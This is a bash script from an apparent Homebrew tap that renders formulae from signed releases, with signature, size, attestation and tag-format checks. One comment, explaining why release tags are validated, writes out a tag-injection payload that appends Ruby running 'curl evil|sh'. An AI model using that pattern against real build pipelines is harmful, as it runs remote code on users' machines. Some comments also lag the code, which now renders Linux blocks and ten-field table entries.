#!/usr/bin/env bash
# Regenerate Formula/*.rb from the latest signed release of each Glyndor product.
#
# Pull-based, mirroring Glyndor/apt: no product pushes into this repository. This
# reads each product's public GitHub release, verifies its signed SHA256SUMS
# against the org release-signing key, and renders a formula that installs the
# macOS binary from that release with the verified checksum. macOS only: Linux
# is served by the apt repo (apt.glyndor.net).
#
# Run by .github/workflows/update.yml on a schedule and on demand.
#
# Exit codes: 0 every product rendered; 3 at least one product was skipped and
# the rest rendered (update.yml commits those, then fails the job); anything
# else is a failure before any product was reached.
set -euo pipefail

# The org's Ed25519 release-signing public key, raw and unpadded base64.
# Verifying against it is what makes the rendered checksum trustworthy rather
# than whatever an attacker-influenced release asset happens to contain.
#
# Rotating the org release key means editing this constant here AND in
# Glyndor/scoop-bucket's render-manifests.sh, on top of the products that embed
# it in their own verifiers. A stale value fails closed: every render aborts on
# a signature that no longer matches.
RELEASE_PUBKEY_B64="HFv7vg5FCY7YyKUDbJhaQSfB9SboJGSblJtFbLmLHzM"

# Second slot, empty until a rotation is in flight. The org rotation is
# make-before-break: phase one publishes a release still signed with the old
# key that carries both, consumers pick the new one up, and only then does
# phase two sign with the new key. A renderer with a single slot cannot take
# part in that -- it would verify fine through phase one and start failing the
# moment phase two lands. And because this channel is pull-based, that failure
# is invisible: the render aborts, no formula is updated, and the tap simply
# stops moving on the last version it could verify. install.sh and install.ps1
# have carried two slots for exactly this reason; this brings the tap level
# with them.
RELEASE_PUBKEY2_B64=""

# Bounds on the bytes this script reads off the network. The signature proves
# what the publisher meant, but it does not bound how much of it there is; the
# release assets are attacker-influenced (whoever can publish a release asset
# controls it), and the embedded python reads both files whole, so without a
# cap here an oversized signature or manifest would have every hourly run
# transfer and allocate whatever the publisher attached.
#
# The numbers, derived from what a legitimate file actually looks like:
#
#   MAX_SUMS_BYTES = 4096 (4 KiB). A podup SHA256SUMS is a handful of
#   `<64-hex>  <asset>\n` lines at under 90 bytes each, a few hundred bytes in
#   total. Even a roster of dozens of products with realistic macOS and Linux
#   binary asset names lands well under a kilobyte; 4 KiB is orders of
#   magnitude of headroom over today's file and still fits comfortably under
#   the size of a single apt sibling's per-signature cap.
#
#   MAX_SIG_BYTES = 64, exact. A raw Ed25519 signature has no other valid
#   length, so any other size is by definition not a signature and is refused
#   the same way whether too large or too small. The check is an equality,
#   not a comparison: anything that is not 64 bytes is wrong here.
#
#   MAX_ASSET_BYTES = 104857600 (100 MiB). The cap on the binary that
#   verify_attestation downloads so its digest can be checked against
#   SHA256SUMS and so the SLSA attestation can be verified against the
#   claimed tag. Today's podup binaries are 5-8 MiB; 100 MiB is over ten
#   times the largest today and leaves room for Electron-class CLI
#   products. Anything larger is suspect as a denial-of-service: the
#   renderer holds the bytes while the attestation check runs.
MAX_SUMS_BYTES=4096
MAX_SIG_BYTES=64
MAX_ASSET_BYTES=104857600

# The only way to override it is --pubkey, which tests/render-formulae.test.sh
# uses to sign a synthetic release with an ephemeral key. A run with no
# arguments trusts the constant above and nothing else, and there is deliberately
# no environment variable that could swap the trust anchor from outside. This is
# the shape Glyndor/apt's verify-debs.sh already uses, where the key is an
# argument for the same reason.
while [ $# -gt 0 ]; do
	case "$1" in
		--pubkey)
			[ $# -ge 2 ] || { echo "--pubkey needs a value" >&2; exit 2; }
			RELEASE_PUBKEY_B64="$2"
			shift 2
			;;
		--pubkey2)
			[ $# -ge 2 ] || { echo "--pubkey2 needs a value" >&2; exit 2; }
			RELEASE_PUBKEY2_B64="$2"
			shift 2
			;;
		*)
			echo "unknown argument: $1" >&2
			exit 2
			;;
	esac
done

# Products to publish, one per line:
#   repo|formula|Class|SPDX licence|description|arm64|x86_64|version check
#
# An asset field of "-" means the product publishes nothing for that
# architecture and the formula omits it; at least one must be a real name. An
# EMPTY field stays an error, because that is what a dropped column looks like.
#
# `arm64`/`x86_64` are the macOS release asset names, and `version check` is the
# argument the formula's test block passes to the installed binary. Add a
# product here once it ships macOS binaries with a signed SHA256SUMS. Keep it in
# step with the apt repo's PRODUCTS list where a product ships on both.
#
# The licence and the version check used to be written into the template for
# every product. Both happened to be right for podup and neither was checkable:
# `brew audit --strict` only reads what the formula declares, so a formula
# claiming MIT for a product that is not MIT passes, and Homebrew shows that
# claim to the user. The org's Apache-2.0 to MIT migration is not finished, so
# that case is reachable rather than hypothetical.
#
# This table is the only place a product is declared. The formula it renders and
# the formulae pruned below follow from it.
#
# The README's table does NOT: scripts/check-products-consistent.sh stopped
# comparing it on 2026-08-26, and its header records why -- the comparison was
# two hand-maintained documents agreeing rather than a check against ground
# truth, and it broke CI for renaming a heading. This comment said ci.yml
# checked the README against this list, and had been false since that day.
#
# So the README drifts unless somebody edits it. Adding a platform here is
# exactly when it does: the table has a per-platform column.
PRODUCTS=(
	"Glyndor/podup|podup|Podup|MIT|Docker-compose translator and runner for rootless Podman|podup-darwin-arm64|podup-darwin-x86_64|podup-linux-arm64|podup-linux-x86_64|--version"
)

root="$(cd "$(dirname "$0")/.." && pwd)"
work="$(mktemp -d)"
trap 'rm -rf "$work"' EXIT

# Download a release's SHA256SUMS(+.sig) and verify the signature, failing closed.
verify_sha256sums() { # $1=repo $2=tag
	rm -f "$work/SHA256SUMS" "$work/SHA256SUMS.sig"
	gh release download "$2" --repo "$1" \
		--pattern SHA256SUMS --pattern SHA256SUMS.sig --dir "$work" --clobber \
		|| return 1
	# Bound the bytes on disk BEFORE the embedded python reads them. The
	# signature is exactly 64 bytes and a legitimate manifest is a few hundred,
	# so anything else is by definition neither, and an attacker who can
	# publish release assets can pick the size of what the renderer transfers
	# and holds in memory. A size refusal is reported here so it stays a third
	# thing and is not folded into either of the two python messages: "our
	# trust anchor is malformed" or "their signature does not verify". The
	# measured size goes in both messages so an oversized file does not look
	# like a parse error.
	sums_size="$(stat -c%s "$work/SHA256SUMS")"
	[ "$sums_size" -le "$MAX_SUMS_BYTES" ] || {
		echo "::error::$1 $2: SHA256SUMS is $sums_size bytes, over the ${MAX_SUMS_BYTES}-byte cap" >&2
		return 1
	}
	sig_size="$(stat -c%s "$work/SHA256SUMS.sig")"
	[ "$sig_size" -eq "$MAX_SIG_BYTES" ] || {
		echo "::error::$1 $2: SHA256SUMS.sig is $sig_size bytes; an Ed25519 signature is exactly ${MAX_SIG_BYTES} bytes" >&2
		return 1
	}
	python3 - "$work/SHA256SUMS" "$work/SHA256SUMS.sig" \
		"$RELEASE_PUBKEY_B64" "$RELEASE_PUBKEY2_B64" <<'PY'
import base64, binascii, sys
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey

msg = open(sys.argv[1], "rb").read()
sig = open(sys.argv[2], "rb").read()


def load(b64):
    # Pad to a 4-character boundary rather than appending "==" blindly, and
    # reject anything outside the base64 alphabet. Without validate=True,
    # b64decode DISCARDS such characters: "AAAA!!!!BBBB" decodes to six bytes
    # without complaint, so a corrupted key silently becomes a shorter one.
    # Trim the ends before validating. The key reaches here as a shell
    # argument, and a value pasted into --pubkey arrives with whatever
    # whitespace came with it; validate=True would reject that as "not base64"
    # and point at the key when the fault is a trailing newline. Only the ends:
    # whitespace INSIDE the string is not a formatting convention for a base64
    # key the way grouping is for a gpg fingerprint, so it stays an error.
    b64 = b64.strip()
    b64 += "=" * (-len(b64) % 4)
    raw = base64.b64decode(b64, validate=True)
    if len(raw) != 32:
        raise ValueError(f"{len(raw)} bytes, not a 32-byte Ed25519 key")
    return Ed25519PublicKey.from_public_bytes(raw)


# Any configured key may be the one that signed this release; an empty slot is
# not a key. Still fails closed -- exhausting the slots is an error, not a
# fallthrough, so a stale pair aborts the render exactly as a single stale key
# did before.
raw_keys = [k for k in sys.argv[3:] if k]
if not raw_keys:
    sys.exit("no release key configured")

# Loading is separate from verifying so that a broken trust anchor of ours is
# not reported as a bad signature of theirs. Wrapping the verify call in
# `except Exception` collapsed both into one message, and the operator then
# went looking at the upstream release for a fault that was in this repository.
# apt/scripts/verify-debs.sh already drew that line; this did not.
try:
    keys = [load(k) for k in raw_keys]
except (ValueError, binascii.Error) as exc:
    sys.exit(f"malformed release public key: {exc}")

for key in keys:
    try:
        key.verify(sig, msg)
    except InvalidSignature:
        continue
    print("SHA256SUMS signature verified")
    sys.exit(0)
sys.exit("SHA256SUMS does not verify against any configured release key")
PY
}

# Verify the build provenance of the release. The signature on SHA256SUMS
# proves the digests the renderer is about to write into formulae; it does
# not prove the digests came from THIS release. An actor who can publish a
# release can take last year's binaries, upload them under a new higher tag
# with the matching old SHA256SUMS and its valid old signature, and the
# renderer accepts them: every digest matches, the signature verifies, and
# the formula points users at old code under a new version number.
# Version monotonicity does not help; the fake tag is higher.
#
# GitHub's SLSA provenance attestations bind an artifact to the tag it was
# built from. A re-uploaded binary still carries the attestation naming its
# OLD tag, so verification against the new tag fails. That is the property
# that closes the gap. Two measured facts decide the shape of this
# function:
#
#   SHA256SUMS itself is NOT attested (`gh attestation verify` on it
#   answers HTTP 404). Only the built artifacts are, so the attested thing
#   has to be an artifact the renderer names.
#
#   `gh attestation verify` takes a file path or an OCI reference. It has
#   no digest-only mode, so the asset has to be downloaded to verify it.
#
# ONE asset per release is verified, not every referenced one. Every asset
# the release ships was built in the same workflow run, so a single
# attestation check proves the tag is honest; the SHA256SUMS is signed as
# a whole, so one downloaded asset's digest matching its SHA256SUMS entry
# extends the signature's trust to the entries the renderer does not
# download. Verifying every asset costs a download for no extra security.
#
# The chosen asset is the first non-dash one in the PRODUCTS table order;
# for podup that is podup-darwin-arm64 (the mac_arm slot). The download's
# SHA-256 is computed and checked against the SHA256SUMS entry for that
# asset before the attestation check runs, so the digest the renderer
# renders for it is the digest that was verified -- and the control
# inspects something rather than confirming two pieces of input agree
# without having read either.
#
# A release predating attestations is a different fault from a failed
# verification, and the message names which: one is "this release was not
# built by a workflow that emits provenance" and the other is "an
# attestation for this release names a different tag." Both fail closed;
# the operator reading the log needs to know which.
#
# Reads $base from its caller (render_product sets it just above).
verify_attestation() { # $1=repo $2=tag $3=asset $4=expected_sha256
	local repo="$1" tag="$2" asset="$3" expected="$4"
	local asset_path="$work/attest.asset"
	local json_path="$work/attestation.json"
	local err_path="$work/attestation.err"
	local size actual

	rm -f "$asset_path" "$json_path" "$err_path"

	# --connect-timeout and --max-time bound the read: a hung TLS or hung
	# stream is the failure mode that would otherwise outlast the job's
	# own deadline. The network-calls check requires --max-time on every
	# curl.
	if ! curl -fsSL --connect-timeout 10 --max-time 120 \
		-o "$asset_path" "$base/$asset"; then
		echo "::error::$repo $tag: failed to download $asset for attestation verification" >&2
		return 1
	fi

	# Bound the bytes on disk BEFORE anything reads them. The cap and
	# its rationale are at MAX_ASSET_BYTES above.
	size="$(stat -c%s "$asset_path")"
	[ "$size" -le "$MAX_ASSET_BYTES" ] || {
		echo "::error::$repo $tag: $asset is $size bytes, over the ${MAX_ASSET_BYTES}-byte cap" >&2
		return 1
	}

	# The digest that gets verified must be the digest that gets rendered.
	# Compute it from the download and compare against the SHA256SUMS
	# entry for this asset before the attestation runs, so a mismatch is
	# a third message and not folded into either of the attestation
	# messages.
	actual="$(sha256sum "$asset_path" | awk '{print $1}')"
	[ "$actual" = "$expected" ] || {
		echo "::error::$repo $tag: downloaded $asset has digest $actual, not the $expected that SHA256SUMS declares" >&2
		return 1
	}

	# --source-ref pins the tag the artifact is claimed to have been
	# built from, --signer-workflow pins the workflow that emitted the
	# attestation. gh enforces them as part of the verify, and exits
	# non-zero when they don't match. The python check below is a sanity
	# pass over the JSON so a successful exit with no entries still
	# fails.
	if ! gh attestation verify "$asset_path" \
		--repo "$repo" \
		--source-ref "refs/tags/$tag" \
		--signer-workflow "$repo/.github/workflows/release.yml" \
		--format json \
		>"$json_path" 2>"$err_path"; then
		# Three failure shapes, distinguished from the gh error text
		# so the operator reading the log knows which fault fired.
		# The first is a release that predates attestations, not an
		# attack; the other two are. All three fail closed.
		local msg
		msg="$(tr '\n' ' ' < "$err_path")"
		if printf '%s' "$msg" | grep -qi 'no attestation\|not found\|404'; then
			echo "::error::$repo $tag: $asset carries no attestation; this release was not built by a workflow that emits provenance, or predates provenance verification" >&2
		elif printf '%s' "$msg" | grep -qi 'signer\|workflow does not match\|cert-identity'; then
			echo "::error::$repo $tag: $asset's attestation was not signed by the release workflow of $repo" >&2
		elif printf '%s' "$msg" | grep -qi 'source ref\|sourcerepositoryref\|different tag'; then
			echo "::error::$repo $tag: $asset's attestation names a different tag; the artifact was built from another tag, not $tag" >&2
		else
			echo "::error::$repo $tag: $asset attestation verification failed: $msg" >&2
		fi
		return 1
	fi

	# A successful verify with no entries in the JSON would mean the CLI
	# returned 0 with nothing to show, which is not a real success. The
	# python block reads the JSON; if gh's output shape changes, this
	# turns into an explicit message instead of a silent pass.
	python3 - "$json_path" <<'PY'
import json, sys
data = json.load(open(sys.argv[1]))
if not isinstance(data, list) or not data:
    sys.exit("attestation verification produced no entries")
PY
}

# Print the verified SHA-256 of an asset. Fails unless the manifest lists it
# exactly once with a well-formed digest.
#
# The signature proves the manifest is the one the product published; it says
# nothing about it being well-formed. Before this, a duplicated entry printed
# BOTH hashes into one field and the run exited 0 -- a fail-open on
# signature-verified input, and in the Scoop bucket's case one that passed
# ci.yml's validation and would have been committed to main. Glyndor/apt's
# publish.yml states the assumption this rests on: the release assets are
# attacker-influenced, because whoever can publish a release controls them.
hash_of() { # $1=asset
	local matches count digest
	matches="$(awk -v a="$1" '$2 == a { print $1 }' "$work/SHA256SUMS")"
	[ -n "$matches" ] || return 1
	count="$(printf '%s\n' "$matches" | wc -l)"
	[ "$count" -eq 1 ] || {
		echo "::error::the verified SHA256SUMS lists $1 $count times; it must list it exactly once" >&2
		return 1
	}
	digest="$matches"
	case "$digest" in
		*[!0-9a-fA-F]* | "")
			echo "::error::the checksum the verified SHA256SUMS gives for $1 is not hexadecimal" >&2
			return 1
			;;
	esac
	[ "${#digest}" -eq 64 ] || {
		echo "::error::the checksum the verified SHA256SUMS gives for $1 is ${#digest} characters, not 64" >&2
		return 1
	}
	printf '%s\n' "$digest"
}

# Build one `on_macos` / `on_linux` block from a platform's pair of assets, or
# nothing at all when the product publishes neither. The result lands in
# $os_blocks rather than on stdout: this has to be able to FAIL, and a command
# substitution would swallow the non-zero into an assignment that succeeds.
#
# It reads $repo, $tag and $base from its caller. That is bash's dynamic scope
# working as intended and it is written down because it does not look like it:
# these are `local` in render_product, so this function is only correct when
# called from there.
platform_block() { # $1=on_macos|on_linux  $2=arm asset  $3=intel asset
	local os="$1" arm="$2" intel="$3" inner="" sha
	os_blocks=""

	[ "$arm" = "-" ] && [ "$intel" = "-" ] && return 0

	if [ "$arm" != "-" ]; then
		sha="$(hash_of "$arm")" || {
			echo "::error::$repo $tag: the verified SHA256SUMS does not list $arm"
			return 1
		}
		inner="    on_arm do
      url \"$base/$arm\"
      sha256 \"$sha\"
    end"
	fi
	if [ "$intel" != "-" ]; then
		sha="$(hash_of "$intel")" || {
			echo "::error::$repo $tag: the verified SHA256SUMS does not list $intel"
			return 1
		}
		[ -n "$inner" ] && inner="$inner
"
		inner="$inner    on_intel do
      url \"$base/$intel\"
      sha256 \"$sha\"
    end"
	fi

	os_blocks="  $os do
$inner
  end"
}

# The Ruby expression naming this platform's asset, or empty when the platform
# publishes none. A single architecture is a bare string: there is nothing to
# pick between, and a ternary whose arms are the same value reads as a bug.
asset_expr() { # $1=arm asset  $2=intel asset
	local arm="$1" intel="$2"
	if [ "$arm" != "-" ] && [ "$intel" != "-" ]; then
		printf 'Hardware::CPU.arm? ? "%s" : "%s"' "$arm" "$intel"
	elif [ "$arm" != "-" ]; then
		printf '"%s"' "$arm"
	elif [ "$intel" != "-" ]; then
		printf '"%s"' "$intel"
	fi
}

# Render one product's formula. Returns non-zero without touching any file when
# the release cannot be read, its SHA256SUMS does not verify, the build
# provenance is missing or names another tag, or an asset the table names is
# missing.
#
# Every step is checked explicitly rather than left to `set -e`: this runs as an
# `if !` condition below, which disables errexit for the whole function, so an
# unchecked failure would carry on and render a formula from a half-read state.
render_product() { # $1=table entry
	local entry="$1"
	local repo formula cls licence desc version_check
	local mac_arm mac_intel linux_arm linux_intel
	local tag version base install_body
	local mac_blocks linux_blocks os_blocks mac_expr linux_expr

	IFS='|' read -r repo formula cls licence desc \
		mac_arm mac_intel linux_arm linux_intel version_check <<<"$entry"

	for field in repo formula cls licence desc \
		mac_arm mac_intel linux_arm linux_intel version_check; do
		[ -n "${!field}" ] || {
			echo "::error::the PRODUCTS entry \"$entry\" has no $field"
			return 1
		}
	done

	tag="$(gh release view --repo "$repo" --json tagName --jq .tagName)" || {
		echo "::error::$repo: could not read the latest release"
		return 1
	}
	version="${tag#v}"

	# The tag is the only field here that comes from outside this repository and
	# carries no signature of its own. SHA256SUMS is verified, and the digests it
	# gives are checked to be 64 hex characters before use -- but the tag travels
	# beside that signature, not inside it, and it lands in an UNQUOTED heredoc
	# that generates Ruby.
	#
	# A tag of the form
	#
	#     v1.0.0/x"\n  def self.x; system("curl evil|sh"); end\n  url "http://a
	#
	# closes the url string and appends Ruby that runs on every `brew install`.
	# Whoever can publish a release in a product repository would get code
	# execution on every machine installing from this tap. The url is the
	# surface because the tag lands in `$base`; it used to be the `version`
	# line as well, which the render dropped when Homebrew started refusing a
	# declared version as redundant, and one interpolation site is as good as
	# two for this.
	#
	# So the version is held to the same standard as the digest: a fixed
	# character set, checked before it is interpolated. Real tags are v5.1.0,
	# v3.7.1 -- digits, dots, and the pre-release and build punctuation semver
	# allows. Nothing else.
	case "$version" in
		"" | *[!0-9A-Za-z.+-]* | .* | *.)
			echo "::error::$repo: the release tag \"$tag\" is not a plain version; refusing to interpolate it into generated code" >&2
			return 1
			;;
	esac
	case "$version" in
		[0-9]*) ;;
		*)
			echo "::error::$repo: the release tag \"$tag\" does not start with a digit after stripping a leading v" >&2
			return 1
			;;
	esac

	verify_sha256sums "$repo" "$tag" || {
		echo "::error::$repo $tag: SHA256SUMS is missing, oversized, or does not verify against the org release key" >&2
		return 1
	}

	# "-" means the product publishes nothing for that slot, so the formula
	# omits it. An EMPTY field is still rejected above: an empty field between
	# two pipes is what a dropped column looks like, and confusing "not
	# published" with "I mistyped the row" would silently ship half a formula.
	#
	# The check is that SOMETHING is published, not that each platform is. A
	# product may ship macOS only, Linux only, or one architecture of each, and
	# all of those render a valid formula. What cannot render is a row naming
	# nothing at all.
	[ "$mac_arm" != "-" ] || [ "$mac_intel" != "-" ] \
		|| [ "$linux_arm" != "-" ] || [ "$linux_intel" != "-" ] || {
		echo "::error::the PRODUCTS entry \"$entry\" publishes no asset for any platform"
		return 1
	}

	base="https://github.com/$repo/releases/download/$tag"

	# Verify build provenance before anything is rendered. The signature on
	# SHA256SUMS proves the digests came from this product's release, but
	# not that THIS release is the genuine one for $tag: an actor who can
	# publish a release can re-upload last year's binaries with the matching
	# old signed SHA256SUMS and have them accepted under a new tag. The
	# attestation is what binds the binary to $tag. Pick the first
	# non-dash asset in the table -- the comment on verify_attestation
	# records why one is enough -- and have the same function compare its
	# download's digest against SHA256SUMS, so the digest the renderer
	# renders is the digest that was verified.
	verify_asset=""
	for candidate in "$mac_arm" "$mac_intel" "$linux_arm" "$linux_intel"; do
		[ "$candidate" != "-" ] && verify_asset="$candidate" && break
	done
	verify_sha="$(hash_of "$verify_asset")" || {
		echo "::error::$repo $tag: the verified SHA256SUMS does not list $verify_asset" >&2
		return 1
	}
	verify_attestation "$repo" "$tag" "$verify_asset" "$verify_sha" || {
		echo "::error::$repo $tag: $verify_asset build provenance is missing, names another tag, or was not signed by the release workflow" >&2
		return 1
	}

	# Build only the blocks the product actually ships, one platform at a time.
	# Two platforms with the same shape is what makes this a function rather
	# than the pair of inlined branches it replaced: the second copy is where
	# the two drift.
	platform_block "on_macos" "$mac_arm" "$mac_intel" || return 1
	mac_blocks="$os_blocks"
	platform_block "on_linux" "$linux_arm" "$linux_intel" || return 1
	linux_blocks="$os_blocks"

	os_blocks="$mac_blocks"
	if [ -n "$linux_blocks" ]; then
		[ -n "$os_blocks" ] && os_blocks="$os_blocks

"
		os_blocks="$os_blocks$linux_blocks"
	fi

	# A bare-binary download stages under its release-asset name, so the name has
	# to be reconstructed here. It comes from the generator's table -- the same
	# source the urls above come from -- rather than from a glob: a product whose
	# assets are not named "<tool>-<os>-<arch>" would match nothing and install
	# an empty formula.
	#
	# The expression now picks on OS as well as architecture, and it has to:
	# until Linux was rendered, both arms of the ternary named a darwin asset,
	# so a Linux install would have downloaded the right binary and then looked
	# on disk for a file called podup-darwin-*, which is not there.
	mac_expr="$(asset_expr "$mac_arm" "$mac_intel")"
	linux_expr="$(asset_expr "$linux_arm" "$linux_intel")"

	if [ -n "$mac_expr" ] && [ -n "$linux_expr" ]; then
		install_body="    asset = if OS.mac?
      $mac_expr
    else
      $linux_expr
    end
    bin.install asset => \"$formula\""
	elif [ -n "$mac_expr" ]; then
		install_body="    # Only macOS assets are published, so there is no platform to pick between.
    asset = $mac_expr
    bin.install asset => \"$formula\""
	else
		install_body="    # Only Linux assets are published, so there is no platform to pick between.
    asset = $linux_expr
    bin.install asset => \"$formula\""
	fi

	# No `version` line. Homebrew scans the version out of the url, and on
	# 2026-09-06 `brew audit --strict` began refusing the declared one as
	# redundant with it: run 34009004969 reported `Stable: version 5.9.1 is
	# redundant with version scanned from URL` over a formula whose generator
	# had not changed since it passed on 2026-09-02 (run 33635857150). The
	# version still reaches the formula, through the tag in every url, and the
	# `$version` variable below still gates and reports the render.
	#
	# What that leaves depending on Homebrew: the scan has to keep reading
	# `.../releases/download/v<version>/<asset>` as <version>. The audit
	# message is the evidence that it does, since the rule only fires when the
	# scanned version EQUALS the declared one, and the `brew audit` job is what
	# reads it on every pull request and on the daily run against `main`.
	cat >"$root/Formula/$formula.rb" <<RB
# typed: false
# frozen_string_literal: true

# Generated by scripts/render-formulae.sh from the signed release of $repo.
# Do not edit by hand: edit the generator and re-run the update workflow.
class $cls < Formula
  desc "$desc"
  homepage "https://github.com/$repo"
  license "$licence"

$os_blocks

  def install
$install_body
  end

  test do
    # The argument comes from the generator's table: brew audit --strict
    # requires a test block, and not every product answers --version.
    system "#{bin}/$formula", "$version_check"
  end
end
RB

	echo "rendered Formula/$formula.rb -> $version"
}

mkdir -p "$root/Formula"

declared=()
skipped=()

for entry in "${PRODUCTS[@]}"; do
	IFS='|' read -r _ formula _ <<<"$entry"
	declared+=("$formula")

	# Render each product on its own. Before this, one product's broken release
	# aborted the whole script under `set -e`, so a missing macOS binary, or a
	# signature that stopped verifying, held back every other product's update
	# too. A failure now leaves that product's existing formula exactly as it is,
	# which still points at its last verified release.
	if ! render_product "$entry"; then
		skipped+=("$formula")
	fi
done

# Drop formulae for products that are no longer in the table. Keyed on the table
# and not on what rendered this run: a product skipped above must keep the
# formula it already has, or one bad release would uninstall it from the tap.
shopt -s nullglob
for existing in "$root"/Formula/*.rb; do
	name="$(basename "$existing" .rb)"
	found=""
	for formula in "${declared[@]}"; do
		[ "$formula" = "$name" ] && found=1 && break
	done
	[ -n "$found" ] && continue
	rm -f "$existing"
	echo "removed Formula/$name.rb (no longer in PRODUCTS)"
done

if [ ${#skipped[@]} -gt 0 ]; then
	echo "::error::skipped ${#skipped[@]} of ${#declared[@]} product(s): ${skipped[*]}"
	exit 3
fi
